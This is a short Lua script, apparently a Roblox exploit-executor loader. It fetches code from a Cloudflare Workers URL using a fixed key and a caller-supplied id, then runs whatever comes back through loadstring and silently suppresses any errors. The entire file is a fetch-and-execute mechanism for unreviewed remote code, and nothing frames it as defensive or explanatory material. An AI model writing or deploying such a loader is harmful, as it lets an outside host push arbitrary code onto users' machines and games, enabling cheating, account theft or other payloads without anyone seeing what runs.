return function(param)
    local HttpService = game:GetService("HttpService")

    local function loadScript()
        local url = string.format("https://small-union-d76e.brunotoledo526.workers.dev//?key=%s&id=%s", "onecreatorx", param)
        local success, result = pcall(game.HttpGet, game, url)
        
        if success and result then
            pcall(loadstring(result))
        end
    end

    loadScript()
end
